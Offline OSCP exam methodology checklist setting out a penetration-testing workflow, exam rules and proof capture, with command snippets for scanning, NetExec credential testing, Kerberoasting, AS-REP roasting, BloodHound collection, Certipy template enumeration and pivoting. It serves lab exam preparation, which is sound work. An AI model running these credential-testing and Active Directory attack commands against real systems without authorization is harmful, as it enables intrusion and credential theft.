OSCP Exam Flow

One repeatable loop. Collect evidence, test the smallest useful hypothesis, and move when the evidence stops improving.
SIMPLE MODEOFFLINEAlt 1
1DiscoverFull TCP scan, focused service scan, then justified UDP. Save raw output.
2EnumerateFingerprint each exposed service manually. Record access, version, config and credentials.
3ValidateChoose one primitive. Confirm every prerequisite before editing or running an exploit.
4ActExploit, stabilize, enumerate locally, escalate, capture proof, then re-enumerate with new access.

Exam risk strip

Cross-target obligations that are easy to lose when you switch machines. Point totals are your recorded estimate; the control panel is authoritative.
0No targets yet

Bank the points — before anything else

When a flag or privileged shell appears, closure outranks curiosity.
No active target. Add the current exam target to make this gate state-aware.
1 · Stay interactiveKeep the target shell open. A web shell or downloaded/copied flag is not valid proof.
2 · Read in placeUse cat/type on the original absolute flag path.
3 · One screenshotShow full flag contents + target IP via ip addr, ifconfig, or ipconfig.
4 · Submit + compareEnter the exact value in the control panel before the attack window ends, then compare it character-for-character against the original shell output. The control panel does not validate whether the submitted proof is correct.
5 · Make reproducibleSave unique screenshot name, exact commands, path, source URL and exploit changes.

Start here

Evidence rotation timer

00:00
Ready — start when testing one hypothesis

Stay while tests produce new evidence. At the limit—or after two failed decisive tests—write the missing prerequisite, park the path, and rotate.

I have this — what next?

Only an IP

Full TCP scan, quick focused scan in parallel, then targeted UDP when the host role justifies it. Save raw output.

A port or service

Use the native client. Test anonymous/default/known credentials and record access, role, data and the next manual proof.

A web application

Hostname/vhosts, source, headers, cookies, robots, sitemap, JavaScript, network calls, content, backups and exposed .git before exploit hunting.

A version banner

Confirm access context, exact build/package, architecture, configuration, trigger and patch/backport status. Version alone is not a vulnerability.

A credential or hash

Record its source, test it across appropriate known services, distinguish authentication from authorization, and respect lockout policy.

A Linux shell

Stabilize; sudo, SUID, capabilities, cron/systemd, services, secrets, containers and internal listeners. Kernel/CVE last.

A Windows shell

Identity/privileges, files/software, services, tasks, registry, credentials, DLL/path, local ports and custom apps. Kernel last.

A domain credential

Fix DNS/time, validate SMB/LDAP/WinRM/RDP, enumerate shares and Kerberos, collect BloodHound, check AD CS, then follow one proven edge.

A new network or route

Prove pivot-host reachability, create one tunnel/route, enumerate the internal surface, and repeat the same target loop.

Root / SYSTEM / Administrator

Stop. Capture the flag from its original location in an interactive shell with the target IP visible, submit it, then protect the report evidence.

Stuck right now — three-minute reset

Stop random actions. Preserve the state, name the missing prerequisite, run one decisive check, then continue or rotate.

No initial access

Re-read every service result; revisit vhosts, source/JS, anonymous/default access, files/backups and credential reuse before another CVE.

Shell, no escalation

Re-check identity and privileges. Rank writable privileged execution, credentials and internal-only services above kernel exploits.

Credential fails

Separate authentication from authorization; fix domain/user format, DNS/time and protocol. Check lockout risk before retrying.

Pivot is broken

Prove reachability from the pivot host, then verify tunnel session, route and connection direction.

Tool is failing

Read the error and local help, make one native/manual request, then try one alternate implementation only.

Root / SYSTEM reached

Stop exploitation. Capture proof + IP in the interactive shell, submit the flag, and finish report notes now.
⚠️ Before any target revert Bank earned proof first → save the re-entry path → record what will be lost → click Revert once → treat shells, tunnels, uploads and changes as stale until revalidated.

Before exploit or target change

Before leaving a shell

Best OSCP Methodology

Evidence first. The output of each step decides the next step.
Alt MREPEATABLE

Prepare and scope

Create one target folder, confirm VPN/route and target identity, start command logging, and write the expected evidence filenames.

Map the attack surface

Run a full TCP scan first, then focused scripts/versioning on open ports. Add a targeted UDP check when the host or role justifies it. Save every raw result.

Enumerate by service

For every port, answer: what is it, can I access it anonymously/default/with credentials, what data does it expose, and which manual test would prove impact?

Build one testable hypothesis

Write the primitive in one sentence: “Because I observed X, I may be able to do Y.” Rank it by evidence, prerequisites, reliability, time and risk.

Validate prerequisites

Confirm access context, architecture, exact build or package revision, required configuration, authentication level and safe trigger. A version string alone is not proof.

Exploit the smallest reliable path

Before changing a file, ACL, service, task, template or policy, record its original state and rollback command. Use the least complex action that proves the primitive; save public exploit sources, modifications and the exact command.

Stabilize and enumerate locally

Record identity, host, interfaces and privileges; upgrade the shell; enumerate services, scheduled tasks, permissions, secrets, histories and reachable networks.

Escalate or move laterally

Validate one privilege or AD edge at a time. Back up mutable state. After every new credential or identity, test appropriate exposed in-scope protocols with lockout awareness, then re-collect the attack path.

Capture proof immediately

Capture the proof from its original location with target IP and interactive identity visible. Preserve commands, output, exploit changes, screenshots and timestamps. Once closure is complete, write the next action and take a short break if fatigue is rising.

Re-enumerate and close

New access changes the attack surface. Re-run the relevant checks, confirm no reporting gaps, save a session export, then move to the next target.

Kill / park rule

Continue while tests add evidence or raise confidence.

Park after 20–30 minutes or two failed tests with no new evidence. Record the missing prerequisite and the exact return condition.

Priority order

  1. Known credentials and reuse
  2. Anonymous/default access
  3. Readable files, source, backups and secrets
  4. Misconfiguration with a proven primitive
  5. Exact-version exploit with prerequisites
  6. Long brute force or fragile exploit last

Fast links

Operational playbooks

Open only the branch you need. The Full Reference contains the exhaustive service-by-service commands.

First commands on every target
mkdir -p "$IP"/{scans,loot,exploits,evidence,notes}
sudo nmap -Pn -n -p- --min-rate 1000 -oA "$IP/scans/tcp-all" "$IP"
sudo nmap -Pn -n -sC -sV -p "$PORTS" -oA "$IP/scans/tcp-detail" "$IP"

# If results look wrong:
ip route; ip addr show tun0
sudo tcpdump -ni tun0 host "$IP"
# lower/remove --min-rate; validate a small port set
Every new credential
nxc smb $TARGETS -u "$USER" -p "$PASS" -d "$DOMAIN" --continue-on-success
nxc winrm $TARGETS -u "$USER" -p "$PASS" -d "$DOMAIN"
nxc rdp $TARGETS -u "$USER" -p "$PASS" -d "$DOMAIN"
nxc ldap $DC_IP -u "$USER" -p "$PASS" -d "$DOMAIN"
smbclient -L //$IP/ -U "$DOMAIN/$USER%$PASS"
rpcclient -U "$DOMAIN/$USER%$PASS" $IP
evil-winrm -i $IP -u "$USER" -p "$PASS"
ssh "$USER@$IP"

Record auth and authorization separately. Check lockout policy before spraying.
Linux and Windows escalation trees
LINUX
sudo -l
├─ SUID/capabilities → known or custom binary → strings/strace/config/PATH/library
├─ cron/systemd/service → privileged execution + writable target or search path
├─ histories/config/keys/DB → credential reuse
├─ groups/containers/mounts/NFS → prove exact prerequisite
└─ exact package/kernel CVE LAST

WINDOWS
whoami /all
├─ token privilege → compatible technique + service context
├─ service/task → privileged account + writable target + restart/trigger
├─ registry/autorun/DLL/path → exact setting + writable location + execution
├─ files/history/DPAPI/config → credential reuse
├─ local-only port/custom app → identify process/account and interact locally
└─ driver/kernel CVE LAST
Web and Active Directory trees
WEB
identity/vhost → source/JS/routes/backups/.git → auth/inputs
→ prove file read/write, auth bypass, SSRF or code execution
→ credential or shell → local enumeration

ACTIVE DIRECTORY
credential → DNS/time/DC → SMB/LDAP/WinRM/RDP
→ shares/users/groups/SPNs → BloodHound + AD CS
→ exact ACL/delegation/certificate edge
→ READ → BACKUP → minimum change → validate → rollback
→ remote access → new identity/host → reuse + re-collect → pivot → repeat

Tool failure ladder

Read the error→Check version/help→Validate DNS/time/route/auth→Try one fallback→Manual proof

Tool failure does not disprove the hypothesis. Two implementations failing with the same prerequisite satisfied is evidence to re-rank it.

⚠ Browser storage is unavailable.
The console is running with temporary in-memory state. Keep an exported/encrypted session backup because closing this tab may lose state.

⏱️ Rotation / fatigue discipline

Rotate because evidence stopped changing, not because a stopwatch beeped. Stay only when you can name the exact prerequisite you are validating next.
After a root/SYSTEM: evidence → submit → notes → short break → next target. Do not keep “exploring” a solved machine.

Service Coverage Audit

Compares imported open services with your command journal and manual coverage checks. The goal is to answer: “What obvious enumeration have I not done?”

Hypothesis Workbench

A finding is not a plan. V19 turns current evidence into ranked hypotheses with prerequisites, kill conditions and one next validation step.
Rule: one hypothesis earns time only while evidence is changing or one precise prerequisite remains.

Cross-Target Correlation

Experienced operators do not treat machines as isolated islands. V19 correlates credentials, usernames, products, versions, subnets and access states across the exam.

V20 AD / Windows Fallback Toolbox

Use only when the core path cannot answer the current question. Native/manual proof first; one alternate implementation second.
RULE-AWARE · SEARCHABLE

RunasCs

Known password → run one harmless command as that local/domain identity → whoami /all → prove actual capability.
.\\RunasCs.exe user1 'Password1!' "cmd /c whoami /all" -d domain.local

SharpView

PowerView unavailable/blocked → use one exact C# PowerView-style query; do not duplicate a full BloodHound/PowerView pass.
.\\SharpView.exe Get-DomainController -Domain domain.local -Server dc.domain.local

windapsearch

Focused LDAP fallback for users, groups, computers and SPNs.
python3 windapsearch.py --dc-ip "$DC_IP" -u "$USER@$DOMAIN" -p "$PASS" -U\npython3 windapsearch.py --dc-ip "$DC_IP" -u "$USER@$DOMAIN" -p "$PASS" --user-spns

Certify

Windows-side AD CS fallback; Certipy remains the primary Kali path.
.\\Certify.exe enum-templates --filter-enabled --filter-vulnerable --current-user

sshuttle

SSH foothold + one known internal subnet → routed fallback when it is simpler than creating another tunnel.
sudo sshuttle -r "$SSH_USER@$PIVOT" 10.10.20.0/24

Native first

whoami /all · net user /domain · net group "Domain Admins" /domain · nltest /domain_trusts · klist · dsquery if installed.
Rule-sensitive / secondary names

Empire / Covenant: currently listed by OffSec as allowed examples, but any feature performing a restricted action is still prohibited. Use only for a specific justified function, not blind automation.

PowerSploit: PowerView and PowerUp are already covered; prefer the individual module you need.

Responder / Inveigh: DO NOT use LLMNR/NBNS/mDNS poisoning or spoofing in the OSCP exam. Keep these names searchable as a rule reminder, not an attack recipe.

ADPEEAS / PingCastle: secondary audit helpers only. Their findings are leads; manually prove the exact edge/permission before acting.

Windows / Active Directory Exam Desk

Issued-domain-credential path, failure diagnosis, then a repeatable Windows post-shell workflow. The order and validation gates matter more than running more tools.

Issued domain credential — first 10 minutes

Run in order, stop when a stronger signal appears, and save output. These are Kali-side commands for an issued, in-scope account—not a spray. Progress is stored per selected target.
0/4
export DOMAIN='domain.local'
export DC='dc01.domain.local'
export DC_IP='10.10.10.10'
export AUTH_USER='issued.user'
export AUTH_PASS='issued-password'
getent hosts "$DC"
dig @"$DC_IP" _ldap._tcp.dc._msdcs."$DOMAIN" SRV +short
sudo ntpdate -q "$DC_IP" 2>/dev/null || date -u
nmap -Pn -n -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,5986 "$DC_IP" -oA ad-baseline
nxc smb "$DC_IP" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN"
nxc ldap "$DC_IP" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN"
smbclient -L "//$DC_IP/" -U "$DOMAIN/$AUTH_USER"
# Local account only: omit -d and use --local-auth.
# Domain account: DOMAIN/user, user@domain, or -d DOMAIN.
nxc smb "$DC_IP" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN" --shares
nxc ldap "$DC_IP" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN" --users
nxc ldap "$DC_IP" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN" --groups
impacket-GetUserSPNs "$DOMAIN/$AUTH_USER:$AUTH_PASS" -dc-ip "$DC_IP" -request -outputfile kerberoast.txt
# After saving confirmed usernames:
impacket-GetNPUsers "$DOMAIN/" -dc-ip "$DC_IP" -request -no-pass -usersfile users.txt -outputfile asrep.txt
bloodhound-ce-python -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN" -dc "$DC" -ns "$DC_IP" -c All --zip
certipy find -u "$AUTH_USER@$DOMAIN" -p "$AUTH_PASS" -dc-ip "$DC_IP" -enabled -vulnerable -stdout
# Inspect current-principal outgoing control first.
# Re-collect after every new identity or material change.

Credential material → safest next proof

Classify what you actually have, prove it on one justified host, then expand only from evidence. This selector stores the material type per target—never the password, hash, ticket or key.
CURRENT CLI · 05 SEP 2026

Authentication → usable access ladder

Record only what you proved for one principal on this target. A successful login is not automatically readable data, command execution, an interactive shell, or admin.
ONE TARGET · ONE PRINCIPAL
Select an exam target and record the principal label.
Transport ≠ authentication[+] ≠ adminCommand execution ≠ interactive proof shellRevalidate after revert

Before executing a graph edge

  1. Name the exact source principal you control.
  2. Name the exact target object and permission/relationship.
  3. Identify the required host, protocol, session and token context.
  4. Prove prerequisites with a read/query before a write.
  5. Record current state, backup and exact rollback for any mutation.
  6. Perform the minimum change; validate the resulting identity/access.
  7. Re-enumerate and re-collect—do not assume the graph updated.
Context reset: every new shell, remote protocol or logon method can produce a different token, group set, profile, network reachability and credential visibility. Run whoami /all and the relevant baseline again.

AD / Windows failure decoder

Paste the exact error or NetExec line. This offline matcher does not send or execute anything.
WAITING
Paste the exact line; classify the failure before changing tools or credentials.

BloodHound edge → safe execution plan

Choose the exact edge and target type. V19 shows the prerequisites, read-only proof, minimum action, verification and rollback—without executing anything.
Uses the fast-path variables above, plus: EDGE_TARGET (user/group/computer/domain), CONTROLLED_PRINCIPAL, CONTROLLED_COMPUTER (include trailing $), COMPUTER_PASS, TARGET_HOST, and—only after recording it—ORIGINAL_OWNER. Run installed -h when a wrapper differs.

Operator rule

Get shell→Baseline→Save + READ output→Validate manually→Exploit one proven path→Re-enumerate

WinPEAS/PrivEscCheck findings are hypotheses. A colored line is not a vulnerability until privileged context + controllable object + trigger/prerequisite are confirmed.

How to read automated output

  1. Save it to a file.
  2. Read credentials/secrets first.
  3. Read token privileges.
  4. Read services and scheduled tasks.
  5. Read installer/autorun/registry findings.
  6. Read non-default software and internal listeners.
  7. Only then look at patch/kernel suggestions.
Do not rerun WinPEAS because you forgot what it printed. Preserve the output and annotate the exact lines that changed your hypothesis.

Stuck / rotate gate

Did you inspect non-default C:\ folders, C:\Users, Program Files and ProgramData?
Did you read PowerShell history and app/service config files—not just run a password grep?
Did you manually validate service/task/file ACLs from automated output?
Did you map local-only listeners to their owning process and test the service locally?
Did your user/context change? If yes, restart the Windows post-shell loop.
No new evidence for ~20–30 min and no precise cheap prerequisite left? Rotate.
Source strategy: Got Root?, “OSCP Windows Enumeration Checklist: My Complete Privilege Escalation Workflow for Every Box” (June 2026), plus current SpecterOps, Impacket, Certipy and BloodyAD documentation for the edge planner. Current rule snapshot
Verified against OffSec OSCP+ Exam Guide / FAQ: 5 Sep 2026
Official guide always overrides this offline snapshot.
❌ spoofing / poisoning
❌ automatic exploitation such as SQLmap / SQLninja
❌ mass vulnerability scanners
❌ AI/LLM chatbots during exam/reporting
❌ prohibited commercial offensive tools/services
⚠️ Metasploit restricted modules/Meterpreter: one selected target; no Metasploit pivoting
⚠️ Responder: tool can be used, poisoning/spoofing cannot

Official proof-capture command
Run this in the interactive target shell. Confirm the path is the flag's original location, then keep the target IP and full flag contents visible together in one screenshot. PowerShell Core / PSSession counts as interactive; a web shell, downloaded file, or copied flag does not.

🔐 ULTIMATE OSCP METHODOLOGY CHECKLIST — V19




V19 layout: Layer 1 = Exam Cockpit, Layer 2 = Full Reference, plus a reliability/compliance layer.

During the exam, start with the Cockpit and jump by search tags; do not scroll the full document linearly.






Exam-time-only OSCP/OSCP+ operating checklist — offline, version-aware and evidence-driven.
Designed for fast decisions under pressure. Exam rules last checked against OffSec's official docs: 06 Sep 2026
EXAM-ONLY: study plans, quizzes, simulations, prohibited-tool workflows and training commands are intentionally excluded.







↩ V19 TARGET HANDOFF + ACCESS TRUTH LAYER

Why: target rotation fails when the return condition exists only in memory; Windows/AD decisions fail when authentication is mistaken for authorization, command execution, an interactive shell or admin.


Six-line resume / park packet


    

  1. Current access / identity: exact user, host and channel; say when admin is not proven.
    2. 

  2. Strongest evidence: one concrete observation that changed the target model.
    3. 

  3. Exact hypothesis: because I observed X, I may be able to do Y.
    4. 

  4. Missing prerequisite: the one right, route, build, configuration or trigger still required.
    5. 

  5. Next decisive command: one command that confirms or rejects the hypothesis.
    6. 

  6. Re-entry / recovery: the exact shell, tunnel, listener, route or foothold needed to return.
    7. 



Complete all six fields before parking. The Target view pauses the evidence timer when it parks a target. Use credential labels or environment-variable names only; common password/hash/ticket/private-key patterns are blocked from this packet. After a revert, treat the packet and recorded protocol outcomes as stale until live access is re-established.


Authentication-to-access ladder


OutcomeWhat it provesNext


Not testedNothingOne exact-host request


Transport / service failsRoute, port, hostname, TLS or service issueFix transport before judging credentials


Authentication rejectedThis exact attempt was rejectedCheck identity scope/format, DNS/time and lockout; retry once


Authenticated onlyThe protocol accepted the identityProve one read/query/session action; do not claim admin


Resource / data accessA specific object, share, query or database is readableRecord exact object/path/rights and follow its evidence


Command executionA command ran in one remote contextRecord the token; obtain an interactive session when required


Interactive shell / sessionA usable live session existsBaseline identity/groups/routes/listeners; admin is separate


Privileged / admin controlEffective privileged control was provedBank original-path proof and report evidence immediately




NetExec interpretation: [+] is accepted authentication, not automatic admin. Upstream documents Pwn3d! per protocol—SMB/WMI generally indicate local-administrator capability, while WinRM/RDP indicate at least execution. Validate the actual token and exact action. Command execution is not automatically an interactive proof shell.


# One target + one current principal. Use installed -h/--help as syntax authority.
nxc smb "$TARGET" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN"
nxc ldap "$DC_IP" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN"
nxc winrm "$TARGET" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN"
nxc rdp "$TARGET" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN"
nxc mssql "$TARGET" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN"
nxc wmi "$TARGET" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN"

# Accepted auth only starts the next proof.
nxc smb "$TARGET" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN" --shares
nxc ldap "$DC_IP" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN" --users
evil-winrm -i "$TARGET" -u "$AUTH_USER" -p "$AUTH_PASS"
xfreerdp /v:"$TARGET" /u:"$AUTH_USER" /d:"$DOMAIN" /p:"$AUTH_PASS" /cert:ignore +clipboard
impacket-mssqlclient "$DOMAIN/$AUTH_USER:$AUTH_PASS@$TARGET" -windows-auth
impacket-wmiexec "$DOMAIN/$AUTH_USER:$AUTH_PASS@$TARGET" "whoami /all"



Never convert this ladder into an indiscriminate spray. Prefer services already observed as exposed and let each result choose the next exact test.





★ READ THIS FIRST — 2026 OSCP+ EXAM OPERATING SYSTEM

EXAM STRUCTURE (OffSec guide checked 06 Sep 2026)

3 stand-alone machines = 60 pts total
  └─ each machine: 10 initial access + 10 privilege escalation

1 AD set / 3 machines = 40 pts total
  ├─ machine #1 = 10
  ├─ machine #2 = 10
  └─ machine #3 = 20

PASS = 70 / 100
NO BONUS POINTS

OFFICIAL 70-POINT COMBINATIONS:
  40 AD + 3× local.txt                         = 70
  40 AD + 2× local.txt + 1× proof.txt          = 70
  20 AD + 3× local.txt + 2× proof.txt          = 70
  10 AD + 3 fully completed standalones        = 70

TIME:
  23h45m attack window
  + 24h report-upload window



The 10 Rules That Matter Under Pressure


    

  1. Enumeration is progress only when you read the output. Do not launch ten tools and ignore their findings.
    2. 

  2. Do not commit to a fixed "AD first" or "standalone first" strategy. After the initial sweep, attack the path with the strongest evidence.
    3. 

  3. Use a 20–30 minute evidence clock. If you have no new port, credential, file, privilege, hypothesis, or validated vulnerability, rotate.
    4. 

  4. Every credential is a new attack surface. Test it against all appropriate in-scope services immediately.
    5. 

  5. Every new shell is a new enumeration phase. Re-run users, privileges, services, internal ports, routes, credentials, scheduled jobs and AD relationships.
    6. 

  6. Bank points immediately. Capture the official proof screenshot and submit the flag in the control panel as soon as you earn it.
    7. 

  7. A passing score is not useful if the evidence is invalid. Documentation is part of exploitation.
    8. 

  8. Break tunnel vision. Recent 2026 passers repeatedly report that short breaks exposed paths they missed while staring at the same machine.
    9. 

  9. Prefer a validated simple path over an exotic CVE. Exact versions, configuration and prerequisites matter.
    10. 

  10. Your notes must work without AI. AI/LLM chatbots are prohibited during both the exam and the reporting phase.
    11. 



Attack Priority — Dynamic, Not Dogmatic


INITIAL ENUMERATION OF ALL TARGETS
              ↓
      WHICH TARGET HAS THE
       STRONGEST SIGNAL?
      /        |         \
 AD path   standalone   obvious
 visible     foothold     privesc
      \        |         /
        ATTACK 20–30 MIN
              ↓
        NEW EVIDENCE?
         /         \
       YES          NO
       ↓            ↓
    CONTINUE       ROTATE
       ↓
  BANK POINTS + EVIDENCE
       ↓
  REASSESS PASS COMBINATIONS



What Counts as "New Evidence"?


new credential
new reachable host/port
new virtual host
new writable file/service/task
new BloodHound edge
new group/ACL/delegation right
new internal-only listener
confirmed vulnerable version/config
working file-read / command execution primitive
new privilege / token / capability
new application source/config/backup



If none of those changed for 20–30 minutes, you are probably repeating a hypothesis rather than progressing.





💰 Bank the points — 90-second closure gate

[DECISION:PROOF] [EXAM:EVIDENCE]


Do this before another exploit, shell exit, revert or break whenever you obtain local.txt or proof.txt.


    

  1. Stay in an interactive target shell. PowerShell Core / PSSession counts.
    2. 

  2. Read the flag with cat or type from its original absolute path; do not use a downloaded, copied or web-shell-displayed flag as proof.
    3. 

  3. Keep the full flag and target IP from ip addr, ifconfig or ipconfig together in one readable screenshot.
    4. 

  4. Submit the exact value in the exam control panel before the attack window ends. The panel does not validate correctness, so compare it yourself.
    5. 

  5. Save the screenshot as <host-or-IP>-<local-or-proof>-original-path.png; record the exact path, commands, output, public-exploit URL and every code change while the shell is still available.
    6. 

  6. Mark closure complete and write the next action. If fatigue is rising, take a 5–10 minute break now—never before the point is banked.
    7. 



INTERACTIVE SHELL → ORIGINAL PATH → IP + FLAG IN ONE SCREENSHOT
                  → CONTROL-PANEL SUBMISSION → REPRODUCIBLE NOTES
                  → ONLY THEN MOVE / REVERT / BREAK


At an estimated 70+ points: stop new exploitation long enough to audit every counted target, flag submission and evidence packet.





🛟 Technical-incident / revert gate

[EXAM:INCIDENT] [V19:STALE]


    

  • Before calling a target broken, verify VPN interface, route, DNS/time where relevant, packet flow, exact target and one minimal known-good request.
    • 

  • The current guide provides a 24-revert bank and allows that bank to be reset once. Record what must be rebuilt, click revert once and wait.
    • 

  • A revert destroys target-side changes. Treat prior shells, tunnels, uploads, services/tasks and temporary sessions as stale until revalidated.
    • 

  • For infrastructure problems, record timestamps and symptoms and contact the proctor immediately; support cannot provide objective hints.
    • 






🧯 Before changing target state — mutation / rollback gate

[V19:MUTATION] [REQ:SAFE_RECOVERY] [REQ:TRIGGER]


    

  1. Prove control and trigger: exact principal, permission, privileged consumer and execution/read event.
    2. 

  2. Capture the original state: path/object, owner, mode/ACL, hash, content, service/task configuration or attribute value.
    3. 

  3. Protect access and evidence: bank earned flags, keep the shell and write the re-entry path; create a secret-free recovery snapshot.
    4. 

  4. Make the smallest reversible change that proves the primitive.
    5. 

  5. Write rollback before execution: restore command, backup path, privilege and trigger/restart sequence.
    6. 

  6. Validate and record: command, result, resulting identity and changed object; restore when practical and revalidate after a revert.
    7. 



READ ORIGINAL → BACK UP / HASH → WRITE ROLLBACK → MINIMUM CHANGE
              → TRIGGER ONCE → VERIFY → RECORD → RESTORE / REVALIDATE





🚫 2026 EXAM RULES — READ BEFORE USING ANY TOOL



This block overrides older habits in the rest of the notes.
Checked against the OffSec OSCP+ Exam Guide and FAQ on 06 Sep 2026.




Prohibited on the OSCP+ exam


SQLmap / SQLninja and similar automatic exploitation tools
Mass vulnerability scanners (Nessus, OpenVAS, Nexpose, etc.)
IP / ARP / DNS / NBNS spoofing
Responder LLMNR/NBT-NS poisoning or other spoofing
Commercial offensive tools/services such as Burp Pro / Metasploit Pro
AI/LLM chatbots during the exam
AI/LLM chatbots during the reporting phase



Metasploit restriction — important


Auxiliary modules  ┐
Exploit modules    ├─ ONE target machine total
Post modules       │
Meterpreter        ┘

"check" also counts toward the selected target restriction.
Once you use restricted Metasploit functionality on Target A,
do NOT use it on Target B.

Metasploit may NOT be used for pivoting.

Allowed against all targets:
  msfvenom
  exploit/multi/handler

Meterpreter itself remains limited to the one selected target.



Responder


The Responder tool itself is listed as allowed, but poisoning and spoofing are not allowed. Therefore, use analyze mode only and do not perform LLMNR/NBT-NS poisoning or spoofing.


Allowed/open-book behavior


    

  • Nmap/NSE, Nikto, Burp Free/Community, DirBuster and normal manual tools are allowed when they do not perform a restricted action.
    • 

  • BloodHound Legacy/CE, SharpHound, PowerView, Rubeus, evil-winrm, Mimikatz, Impacket and PrintSpoofer are listed by OffSec as allowed examples.
    • 

  • Online notes/resources are allowed, but do not ask another person/community for exam help.
    • 

  • PowerShell Core / PSSession is accepted as an interactive shell.
    • 

  • Do not download exam-environment files, applications or source locally unless it is necessary to compromise a target; delete any such local copy after completing the objective.
    • 

  • Online guessing is not a default enumeration step: check scope, lockout/rate-limit risk and known usernames first; use an evidence-based shortlist and stop when the signal does not improve.
    • 

  • Make every report target/IP unambiguous and verify section order against the control panel; OffSec states that machines are graded and valued in the order documented.
    • 

  • Create the final .7z on Kali, visually review the PDF, compare the upload MD5, and click the final Submit File button.
    • 

  • All exam activity should be performed on the proctored host.
    • 

  • Always re-check the official guide on exam day because tool rules can change.
    • 



Official references:


    

  • https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide
    • 

  • https://help.offsec.com/hc/en-us/articles/4412170923924-OSCP-Exam-FAQ
    • 






⚗ V19 TRUST / RELIABILITY LAYER — READ THE LABELS

[V19:TRUST] [V5:TRUST] [EXAM:2026-09-06] (the V5 tag is retained for old bookmarks/searches)




Last rule verification: 06 Sep 2026.

The official OffSec Exam Guide/FAQ always override this checklist if the rules change.




Label legend


✅ EXAM-COMPATIBLE
   The action is consistent with the currently published OSCP+ rules.
   This is about the ACTION, not a blanket approval of every feature in a tool.

⚠️ EXAM-RESTRICTED
   Allowed only under a specific OffSec restriction or only when the action itself
   does not cross into a prohibited feature.

❌ EXAM-PROHIBITED
   Do not perform this action during the exam.

✓ FIRST CHOICE
   Prefer this path first when prerequisites match.

△ FALLBACK
   Useful alternative, legacy target compatibility, or tool-dependent path.

! LAST RESORT
   High-risk, fragile, disruptive, or low-confidence until exact prerequisites match.



Prerequisite markers


[REQ:LOCAL_SHELL]       local command execution already obtained
[REQ:DOMAIN_CREDS]      valid AD credentials
[REQ:WRITE_ACCESS]      exact target file/dir/object is writable
[REQ:TRIGGER]           privileged action can be invoked or naturally occurs
[REQ:RESTART]           service/task can be restarted/triggered where needed
[REQ:EXACT_BUILD]       exact OS/product/package/build confirmed
[REQ:NETWORK_PATH]      route/DNS/port path verified
[REQ:PRIVILEGE]         named token/capability/right is actually enabled
[REQ:CONFIG]            vulnerable configuration is confirmed, not inferred
[REQ:SAFE_RECOVERY]     failure/crash can be recovered without losing the exam path



Most important exam-rule distinction


TOOL NAME ≠ AUTOMATICALLY ALLOWED OR PROHIBITED

Ask:
"What ACTION is this feature performing?"

Example:
Responder is listed by OffSec as an allowed tool.
Responder poisoning/spoofing is explicitly NOT allowed.

BloodHound / SharpHound / Impacket / PrintSpoofer are listed as allowed examples.
A prohibited feature or action remains prohibited even if launched from an allowed tool.



Current rules that this file treats as hard constraints


❌ AI/LLM chatbot use during the active exam
❌ AI/LLM chatbot use during the reporting phase
❌ SQLmap / SQLninja / similar automatic exploitation
❌ mass vulnerability scanners
❌ IP / ARP / DNS / NBNS spoofing
❌ Responder poisoning/spoofing
❌ commercial offensive tools/services such as Burp Pro or Metasploit Pro

⚠️ Metasploit Auxiliary / Exploit / Post + Meterpreter:
   one selected target machine only
   "check" also commits the selected target
   Metasploit cannot be used for pivoting

✅ msfvenom and exploit/multi/handler:
   may be used against all targets under the published guide,
   except Meterpreter payload usage remains restricted to the one selected target



Proof/evidence hard constraints


[ ] Read local.txt / proof.txt from ORIGINAL LOCATION
[ ] Use an INTERACTIVE shell
[ ] PowerShell Core / PSSession counts as interactive
[ ] Linux full points: root shell
[ ] Windows full points: SYSTEM / Administrator / admin-privileged user
[ ] Screenshot contains proof-file contents AND target IP
[ ] Show IP with ipconfig / ifconfig / ip addr
[ ] Submit local.txt/proof.txt to control panel BEFORE exam ends
[ ] Report must reproduce every attack step



2026 tool snapshot used by V19


NetExec / nxc
  Kali package observed: 1.5.1
  Current binaries: netexec, nxc, nxcdb

BloodHound CE
  Kali package observed: 9.6.0
  Initial setup: sudo bloodhound-setup
  Current launcher: bloodhound-start
  "bloodhound" launcher is deprecated on current Kali

BloodHound Linux collector
  PRIMARY for CE: bloodhound-ce-python
  LEGACY ONLY: bloodhound-python
  Do not feed Legacy collector output into CE by assumption.

Impacket
  Kali convention: impacket-<tool>
  e.g. impacket-GetNPUsers, impacket-GetUserSPNs, impacket-getTGT,
       impacket-secretsdump, impacket-wmiexec

Certipy
  Current command family: certipy find / req / auth / shadow / template / ...
  Verify your installed build with: certipy -v

Ligolo-ng
  v0.9.1 snapshot: interface_create / tunnel_start / interface_add_route remain supported
  v0.8+ also includes autoroute; explicit managed routes remain the predictable recovery path
  Prefer certificate fingerprint validation with self-signed TLS.
  -ignore-cert is an emergency debug fallback, not the preferred default.



Exam-day version rule


# YOUR INSTALLED VERSION WINS OVER A CHEATSHEET.
nxc --version 2>/dev/null
certipy -v 2>/dev/null
impacket-wmiexec -h 2>/dev/null | head
bloodhound-ce-python -h 2>/dev/null | head
./proxy -version 2>/dev/null || ./proxy -h 2>/dev/null | head



If syntax differs:


STOP → read local --help → adjust syntax → update your personal copy.

“sandbox bypass = host root”

!/△






Five questions before spending >10 minutes on any privilege-escalation idea


1. What exact privileged security boundary am I crossing?
2. Which exact object/permission/configuration gives me control?
3. Can I prove the prerequisite with one command?
4. Can I trigger the privileged behavior?
5. What output proves success or disproves the hypothesis?



If you cannot answer 3 of 5, enumerate more before exploiting.

🛫 OSCP EXAM COCKPIT — V19




Layer 1: use this first.

This section is deliberately short compared with the full reference.

Use it to decide what to do next, then jump to a tagged deep-reference section only when required.


